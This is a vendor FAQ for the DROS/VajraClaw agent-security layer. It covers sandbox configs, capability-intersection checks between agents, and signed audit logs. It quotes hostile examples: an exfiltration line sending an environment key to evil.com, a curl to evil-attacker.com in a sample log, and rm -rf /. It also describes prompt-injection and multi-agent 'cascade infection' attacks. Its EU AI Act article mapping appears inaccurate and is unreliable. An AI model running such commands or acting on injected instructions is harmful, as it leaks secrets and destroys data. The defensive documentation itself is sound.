# DROS & VajraClaw Zero-Trust Safety Governance FAQ
## Geek's Hands-on Defense Guide for OpenClaw & Hermes Agent Ecosystems

This FAQ is designed specifically for developers and security geeks utilizing **OpenClaw** and **Hermes Agent**. It focuses on preventing prompt injections in third-party **Skills (plugins)**, mitigating "cascade infection" in **Multi-Agent** workflows, and establishing physical-layer execution boundaries.

---

## Table of Contents
1. [Q1: As an OpenClaw / Hermes Agent user, what is the biggest risk of third-party Skills, and how does VajraClaw block malicious exploits?](#q1-as-an-openclaw--hermes-agent-user-what-is-the-biggest-risk-of-third-party-skills-and-how-does-vajraclaw-block-malicious-exploits)
2. [Q2: How do I configure `config.yaml` and DROS rules to implement a physical sandbox for OpenClaw Skills?](#q2-how-do-i-configure-configyaml-and-dros-rules-to-implement-a-physical-sandbox-for-openclaw-skills)
3. [Q3: Hermes Agent desktop version has local Terminal execution rights. How do we prevent it from running 'rm -rf' or leaking keys after an indirect prompt injection?](#q3-hermes-agent-desktop-version-has-local-terminal-execution-rights-how-do-we-prevent-it-from-running-rm--rf-or-leaking-keys-after-an-indirect-prompt-injection)
4. [Q4: Multi-Agent workflows are vulnerable to 'cascade infection' and 'privilege escalation'. How does DROS's BEC Chain solve this?](#q4-multi-agent-workflows-are-vulnerable-to-cascade-infection-and-privilege-escalation-how-does-dross-bec-chain-solve-this)
5. [Q5: What is the mathematical formula for BEC Chain intersection calculation? Will it slow down OpenClaw / Hermes Agent?](#q5-what-is-the-mathematical-formula-for-bec-chain-intersection-calculation-will-it-slow-down-openclaw--hermes-agent)
6. [Q6: When an interception occurs, how does DROS perform cryptographic auditing and non-repudiation tracing?](#q6-when-an-interception-occurs-how-does-dros-perform-cryptographic-auditing-and-non-repudiation-tracing)
7. [Q7: Will running DROS & VajraClaw disrupt my existing OpenClaw / Hermes Agent development workflow?](#q7-will-running-dros--vajraclaw-disrupt-my-existing-openclaw--hermes-agent-development-workflow)
8. [Q8: If the DROS central console (Fleet Manager) or host operating system is completely compromised, will VajraClaw's protection rules be forcibly disabled?](#q8-if-the-dros-central-console-fleet-manager-or-host-operating-system-is-completely-compromised-will-vajraclaws-protection-rules-be-forcibly-disabled)
9. [Q9: How does DROS help enterprises align with the EU AI Act? What are the specific mapping legal clauses?](#q9-how-does-dros-help-enterprises-align-with-the-eu-ai-act-what-are-the-specific-mapping-legal-clauses)
10. [Q10: Since DROS / VajraClaw is stateless, how do we know if it is running correctly? What if it crashes or 'forgets' rules?](#q10-since-dros--vajraclaw-is-stateless-how-do-we-know-if-it-is-running-correctly-what-if-it-crashes-or-forgets-rules)
11. [Q11: Without the central console, how do administrators view logs in standalone VajraClaw or VajraClaw+? Do they have to hunt through folders?](#q11-without-the-central-console-how-do-administrators-view-logs-in-standalone-vajraclaw-or-vajraclaw-do-they-have-to-hunt-through-folders)
12. [Q12: How do L1 ATR semantic-cleansing and L2 Vajra execution-boundary contracts differ in positioning? How do I configure and combine them?](#q12-how-do-l1-atr-semantic-cleansing-and-l2-vajra-execution-boundary-contracts-differ-in-positioning-how-do-i-configure-and-combine-them)
13. [Q13: Does DROS prevent all AI attacks? What is the Formal Boundary Definition and limitations of DROS?](#q13-does-dros-prevent-all-ai-attacks-what-is-the-formal-boundary-definition-and-limitations-of-dros)

---

### Q1: As an OpenClaw / Hermes Agent user, what is the biggest risk of third-party Skills, and how does VajraClaw block malicious exploits?

*   **Geek's Pain Point**: Third-party Skills downloaded from marketplaces may carry hidden prompt injections or contain malicious python code (e.g., `os.system("curl http://evil.com/leak?key=" + env_key)`).
*   **VajraClaw Physical Defense**:
    1.  **FFI Binary Interception**: The VajraClaw SDK (compiled in native C/Go) sits between the Agent decision layer and the OS. When a hijacked Agent attempts an unauthorized Tool Call, VajraClaw intercepts the request via `evaluateToolCallWithAudit()`.
    2.  **Thread-Level Syscall Monitoring**: If malicious code tries to bypass the Agent framework and call the OS directly, DROS's **GuardVM** captures the Syscall at the kernel level. If it isn't explicitly authorized by the execution credential, GuardVM issues a `SIGKILL` to immediately terminate the process.

---

### Q2: How do I configure `config.yaml` and DROS rules to implement a physical sandbox for OpenClaw Skills?

To restrict third-party Skills, developers must define containment policies in DROS's `config.yaml` and policy manifests for `agent.skills.*`.

#### Configuration 1: Edit `config.yaml` to Enable Thread Isolation
Ensure your `config.yaml` has the GuardVM isolation flags enabled:
```yaml
# ====================== DROS 7.3 Skill Isolation Config ======================
guard_vm:
  # Enable thread-level runtime containment
  enable_thread_isolation: true
  
  # Sensitive syscalls prohibited for all untrusted third-party Skills
  forbidden_syscalls:
    - "sys_execve"      # Prevent execution of arbitrary binaries
    - "sys_socket"      # Prevent direct network socket creation (data exfiltration)
    
  # Exclusive path whitelist for third-party sandboxes
  allowed_sandbox_paths:
    - "./scratch"
    - "./User_Pavilion/temp"
```

#### Configuration 2: Define Rules for Skill Capabilities (BEC)
When OpenClaw dynamic loads a Skill, it receives a temporary By-Execution Certificate (BEC). Bind it to a rule whitelist:
```json
{
  "rule_id": "rule_openclaw_skills_default",
  "actor": "agent.skills.*",
  "conditions": { "action": ["read_file", "write_file", "execute_command"] },
  "constraints": {
    "paths": {
      "match": "^\\./(scratch|User_Pavilion/temp)/.*",
      "allow": true
    },
    "commands": { "match": ".*", "allow": false },
    "network": { "outbound": false }
  },
  "behavior": "DENY_AND_ALERT"
}
```
*   **Tip**: Mark all downloaded third-party plugins as `untrusted` at initialization, forcing VajraClaw to auto-apply the narrowest `DENY_AND_ALERT` sandbox rules.

---

### Q3: Hermes Agent desktop version has local Terminal execution rights. How do we prevent it from running 'rm -rf' or leaking keys after an indirect prompt injection?

*   **Geek's Pain Point**: When debugging, Hermes Agent parses a compromised file containing a jailbreak instruction, leading the LLM to trigger terminal commands like `rm -rf /` or leak your `.git/config` token.
*   **VajraClaw Physical Defense**:
    1.  **Token Stream DFA Filtering**: Outgoing token streams flow through `matchTokenStreamWithAudit()`. VajraClaw's C/Go DFA state machine identifies and strips dangerous exfiltration patterns or hijacked command instructions in microseconds.
    2.  **Allowed Scopes Lockdown**: Even if the LLM is fully tricked and invokes the `execute_command` tool, VajraClaw checks the active BEC. Since the allowed scopes do not authorize root writes or key directory access, VajraClaw blocks the execution before it reaches the terminal shell.

---

### Q4: Multi-Agent workflows are vulnerable to 'cascade infection' and 'privilege escalation'. How does DROS's BEC Chain solve this?

*   **Cascade Infection**: Agent A (web crawler) gets infected by a malicious webpage. It commands Agent B (database administrator) to wipe the user tables. Since Agent B trusts its peer (Agent A), it executes the purge.
*   **DROS Solution: Cryptographic BEC Chain**:
    DROS mandates that all inter-agent communications carry a cryptographically signed **BEC Chain** in their request context.
    When Agent B receives a command, the VajraClaw SDK traces the calling chain upward and computes the **intersection of capabilities**.

---

### Q5: What is the mathematical formula for BEC Chain intersection calculation? Will it slow down OpenClaw / Hermes Agent?

For a collaboration chain of $Agent_1 \rightarrow Agent_2 \rightarrow \dots \rightarrow Agent_n \rightarrow \text{System Tool}$, VajraClaw evaluates the following **dynamic intersection**:

$$\text{Effective Scope} = \bigcap_{i=1}^{n} \text{Scope}(Agent_i)$$

#### Case Analysis:
*   $Agent_A$ (Low-privilege Web Crawler) Scope: `{ Read: /tmp/crawler, Call: Agent B }`
*   $Agent_B$ (High-privilege DB Admin) Scope: `{ Read: /database/main, Write: /database/main }`
*   When a compromised Agent A commands Agent B to write to the database, VajraClaw evaluates:
    $$\text{Effective Scope} = \text{Scope}(Agent_A) \cap \text{Scope}(Agent_B) = \emptyset$$
*   Since the intersection evaluates to empty, VajraClaw **melts the call in less than 1 millisecond**, rejecting Agent B's database execution.

#### Performance Metrics:
*   **Zero Token Overhead**: Verification and cryptographic checks run strictly locally in memory. **No remote LLM API calls are involved**.
*   **Microsecond Latency**: Built in native C/Go, the Vajra DSL rules engine utilizes an **O(1) Bitmap algorithm**. Policy checks take only **10 to 50 microseconds**, adding completely negligible overhead to LLM execution cycles.

---

### Q6: When an interception occurs, how does DROS perform cryptographic auditing and non-repudiation tracing?

Upon blocking a call, VajraClaw outputs a cryptographically signed audit log that proves the origin of infection:

```json
{
  "timestamp": "2026-06-10T23:45:00Z",
  "action": "BLOCK_TOOL_CALL",
  "tool": "execute_bash_command",
  "attempted_payload": "curl http://evil-attacker.com/leak",
  "error_code": "ERR_BEC_SCOPE_VIOLATION",
  "bec_chain": [
    { "agent": "OpenClaw_DBManager_Agent", "execution_id": "exec-99b8", "sign": "0x8aef..." },
    { "agent": "OpenClaw_WebCrawler_Agent", "execution_id": "exec-124a", "sign": "0xfd42..." }
  ],
  "taint_analysis": {
    "source": "OpenClaw_WebCrawler_Agent",
    "reason": "Token Stream matched pattern [URL_OUTBOUND_LEAK] from input data stream"
  }
}
```
Through `taint_analysis` and `bec_chain`, administrators can instantly pinpoint that the crawler was compromised, clearing the DB manager of insider liability.

---

### Q7: Will running DROS & VajraClaw disrupt my existing OpenClaw / Hermes Agent development workflow?

**Almost completely transparent, intervening only under active exploits.**

*   **No Code Changes**: Developers can write Skills and Multi-Agent scripts without altering business code logic. Just maintain standard Python code routines.
*   **Configure Once, Defend Everywhere**: DROS operates behind the scenes, intercepting downstream FFI calls and token streams. Developers only see alerts when a Skill attempts to breach the boundaries defined in `config.yaml`.
*   **The Ultimate ABS (Anti-lock Braking System) for Agents**: It lets AI run at full speed while guarding the physical execution boundaries, keeping local networks safe without hurting developer UX.

---

### Q8: If the DROS central console (Fleet Manager) or the host operating system's administrative privilege is completely compromised by hackers, will VajraClaw's protection rules be forcibly disabled, leaving the system wide open?

**By architectural design, this is physically prevented. Even if the control plane is compromised, the defense rails automatically lock down!**

A common question is: Since DROS provides a Web Control Panel to view or edit rules, if the panel is compromised, wouldn't the protection become useless?

DROS enforces strict **separation of developer/test environments from production, isolated via a cryptographic root of trust**. The concrete defense layers are as follows:

1. **Environment Mode Separation (Local Dev vs. Production)**:
   * **Local / Hacker Mode**: For easy local debugging, the developer console (Port 8000) permits viewing, editing, and hot-compilation of `Vajra.md` directly in the UI.
   * **Production Mode**: In production deployments, the write and hot-compile endpoints (e.g., `POST /api/policy`) on the control panel are **physically disabled**, making the console entirely read-only for monitoring and log auditing.

2. **Cryptographic Signature Lock (Ed25519 / HSM)**:
   * In production, the running VajraClaw node enforces **Ed25519 cryptographic signature verification** when loading the binary policy package (`policy.bin`).
   * The private keys used for signing are kept offline in cold keys or HSMs (Hardware Security Modules); **the online control panel does not hold the signing keys**.
   * Even if a hacker breaches the control panel and attempts to compile a malicious policy, the generated package will lack a valid cryptographic signature. VajraClaw will detect the invalid signature and immediately trigger a **Fail-Closed Fatal Panic**—**forcing the Agent process to crash and self-destruct** rather than executing unauthorized rules.

3. **GitOps & Audit Trail**:
   * Production rule updates do not rely on web interface buttons. Instead, they must go through code repository (e.g., Git) Pull Requests for review and multi-party sign-offs, followed by automated CI pipelines calling the HSM to sign and distribute the policy.

4. **Immutable Base Rules & Hardware Enclave**:
   * Core security baselines (such as prohibiting unauthorized system calls) are loaded read-only into memory. Combined with hardware TEE isolation (Intel SGX, AMD SEV), this ensures that even if the host OS administrative privilege (Root) is fully compromised, attackers cannot bypass the bitmap policies locked in the secure enclave.

**In summary: A compromise of the control plane only represents the loss of configuration management privileges, while the physical defense rails on the nodes will automatically lock down. DROS establishes not just an Agent Firewall, but an Immutable Runtime Root of Trust for the Agent execution layer. The system will only "Fail-Closed" and will never allow "Privilege Escalation".**

---

### Q9: How does DROS help enterprises align with the EU AI Act? What are the specific mapping legal clauses?

The EU Artificial Intelligence Act (EU AI Act) imposes explicit legal constraints on the traceability and controllability of autonomous AI systems. DROS's non-repudiation execution model maps directly to these compliance clauses:

**Article 26 (Traceability & Logging)**:
* **Compliance Requirement**: High-risk AI systems must automatically log events throughout their lifecycle to ensure traceability and facilitate post-incident investigations.
* **DROS Solution**: DROS binds the unique UUID of `policy.bin` and its SHA-256 certificate hash directly to every single interception log, providing enterprises with a tamper-proof decision origin credential.

**Article 28 (High-Risk Systems Boundaries)**:
* **Compliance Requirement**: Technical or physical boundaries must be established to prevent AI systems from exceeding their authorized scopes or causing irreversible real-world damage.
* **DROS Solution**: Operating directly at the FFI boundary, VajraClaw's microkernel instantly executes a Strict Fail-Closed melt (Panic) if it detects any bit-matrix boundary violation, halting the execution immediately.

**Article 50 (Transparency & Accountability)**:
* **Compliance Requirement**: The legal liability of autonomous AI operations must be clearly attributable.
* **DROS Solution**: Through Root CA asymmetric key signatures cryptographically bound to UUID serial numbers, any command issued can be mathematically verified to see \"which CA authorized it,\" establishing clear attribution of legal responsibility.

---

### Q10: Since DROS / VajraClaw is stateless, how do we know if it is running correctly? What if it crashes or 'forgets' rules?

**This is the core of SRE (Site Reliability Engineering) and security monitoring. Statelessness means 'no business or session state is stored' for extreme performance, but it never means a 'lack of observability'.**

DROS implements three layers of active protection and observability to ensure the security mesh is always monitored:

1. **FFI Rigid Interception (Physically impossible to 'forget to execute')**:
   * VajraClaw is not an optional bypass monitor. It is **hard-coded directly into the single code path where the Agent invokes Tool calls**, either as an SDK library or a sidecar. The Agent 'must' invoke VajraClaw to perform bitmap verification to call any external tool (such as databases or APIs). If VajraClaw crashes or fails to load, the execution path physically breaks and returns null capabilities, preventing the Agent from executing any action. This is the **Fail-Closed (Default Deny)** mechanism.

2. **Microsecond Heartbeats & Active Polling**:
   * The VajraClaw daemon running on each VM/container node periodically sends microsecond-level heartbeat packets to the central controller (Fleet Manager / VajraAgent). These heartbeats contain no business privacy, only system metrics (CPU/RAM), running status, and the cryptographic hash of the currently loaded `policy.bin`. If the central console detects a heartbeat timeout (e.g., exceeding 2 seconds) on any node, it triggers an instant alert and routes failover configurations.

3. **Cryptographic Log Streams & Silence Alerts**:
   * Every validation check (whether ALLOW or BLOCK) instantly generates an audit log **cryptographically signed** by the node's private key and streams it to the central log repository. If the Agent continues to process conversations and API requests, but the central system receives no signed logs from that node, the logging system triggers a **Silence Alert**—warning administrators that the node might be hung or bypassed, prompt-injecting immediate security incident response.

---

### Q11: Without the central console, how do administrators view logs in standalone VajraClaw or VajraClaw+? Do they have to hunt through folders?

**No manual hunting is required. Although the standalone versions lack a centralized visual panel, they strictly follow standard SRE logging practices and Unix philosophy, providing intuitive system-level integration.**

Without a central console, administrators can view and monitor verification/block logs using three standard methods:

1. **System-Level Logging (SystemD / Journalctl)**:
   * VajraClaw outputs all verification and interception logs in standard JSON format directly to the standard output streams (stdout/stderr).
   * If you run your Agent as a SystemD service (such as `lobster`), the OS automatically manages these logs. You can stream them in real time with a single command:
     ```bash
     journalctl -u lobster -f
     ```

2. **Standard & Customizable Log Files (JSON Logs)**:
   * You can configure a standard path (e.g., `log_path: "/var/log/vajraclaw/audit.json"`) in your config file (e.g., `openclaw.json`).
   * VajraClaw automatically generates daily-rotated structured JSON logs at this path. Administrators can watch block events dynamically using:
     ```bash
     tail -f /var/log/vajraclaw/audit.json
     ```

3. **Seamless Integration with Open-Source Log Collectors**:
   * Because logs are structured as clean, single-line JSON strings, developers can easily hook up lightweight agents like Filebeat, Vector, or FluentBit to forward logs directly into existing corporate ELK stacks or Grafana Loki dashboards without any customization.

---

### Q12: How do L1 ATR semantic-cleansing and L2 Vajra execution-boundary contracts differ in positioning? How do I configure and combine them?

*   **System Positioning: Radar vs. Braking System**
    *   **L1 ATR (Agent Threat Rules) is the Pluggable Radar**: Its core objective is to inspect and sanitize incoming external payloads (User Prompt, RAG Context) before they reach the LLM. It blocks known injection patterns (T001, T002) at milliseconds speed.
    *   **L2 Vajra Contract is the Firewall and Braking System**: It does not care what the LLM generates; if the output intent attempts to call unauthorized system tools (T003) or read files out-of-scope, VajraClaw blocks the execution at the FFI/API boundary.
*   **Configuration Guide (DrosGuard SDK)**:
    Deploy the dual-layer protection inside your Agent loop with only a few lines of code:
    ```python
    from dros_sdk import DrosGuard

    # Initialize DrosGuard (loads the local contract and pluggable ATR rules)
    guard = DrosGuard(contract_path="vajra_finance_auditor.yaml")

    # 1. L1 Semantic Sanitization (intercept T001/T002 threats)
    guard.check_query(user_query)

    # 2. L2 FFI Sandbox Interception (control T003-T007 actions)
    guard.check_tool_execution(tool_name)
    guard.check_resource_access(target_path)
    ```

---

### Q13: Does DROS prevent all AI attacks? What is the Formal Boundary Definition and limitations of DROS?

**No. DROS explicitly avoids attempting semantic model alignment or moral evaluation. We provide deterministic enforcement guarantees at the execution boundary rather than non-deterministic semantic guardrails.**

#### 1. What DROS Guarantees
*   **Execution Authorization**: Any tool or Syscall execution is matched against the active Vajra contract. Violations are instantly blocked via thread termination (`SIGKILL`).
*   **Identity Verification**: All multi-agent invocations are verified using cryptographically signed BEC Chains, protecting against confused deputy vulnerabilities.
*   **Audit Integrity**: System logs are generated in compliance with the NIST OSCAL format, securing tamper-evident forensics.

#### 2. What DROS Does Not Guarantee
*   **Semantic Correctness**: DROS does not verify whether LLM reasoning is correct or logically sound.
*   **Model Alignment**: DROS does not enforce model alignment or prevent inappropriate language generation.
*   **Hallucination Tolerance**: If the LLM generates hallucinations but does not execute any out-of-scope tools or paths, DROS stays silent. This design maintains low False Positive Rates (FPR < 2%) for production workloads.


